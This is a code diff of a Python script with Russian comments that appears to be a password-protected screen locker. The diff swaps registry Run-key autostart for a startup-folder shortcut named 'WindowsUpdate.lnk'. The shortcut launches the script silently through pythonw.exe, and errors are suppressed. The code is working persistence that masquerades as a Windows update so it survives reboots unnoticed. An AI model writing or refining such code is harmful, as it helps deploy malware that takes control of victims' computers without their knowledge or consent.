@@ -8,6 +8,8 @@ import tempfile
 import urllib.request
 import tkinter as tk
 import shutil
+import winshell
+from win32com.client import Dispatch
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -15,7 +17,7 @@ PASSWORD = "1601"
 TIMER_SECONDS = 15   # стартовый таймер (0 — если из автозагрузки)
 # ============================================================
 
-# ---------- НАДЁЖНЫЙ АВТОСТАРТ (РЕЕСТР) С КОПИРОВАНИЕМ ----------
+# ---------- НАДЁЖНЫЙ АВТОСТАРТ (ПАПКА + ЯРЛЫК) ----------
 def add_to_startup():
     try:
         # Путь к текущему файлу (может быть .py)
@@ -31,14 +33,16 @@ def add_to_startup():
                 pass
             current_path = pyw_path
         
-        # Прописываем в автозагрузку путь к .pyw файлу
-        import winreg
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
-                         sys.executable.replace("python.exe", "pythonw.exe") + ' "' + current_path + '"')
-        winreg.CloseKey(reg)
+        # Создаём ярлык в папке автозагрузки
+        startup_folder = winshell.startup()
+        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
+        
+        shell = Dispatch('WScript.Shell')
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
+        shortcut.Arguments = '"' + current_path + '"'
+        shortcut.WorkingDirectory = os.path.dirname(current_path)
+        shortcut.save()
     except:
         pass
 
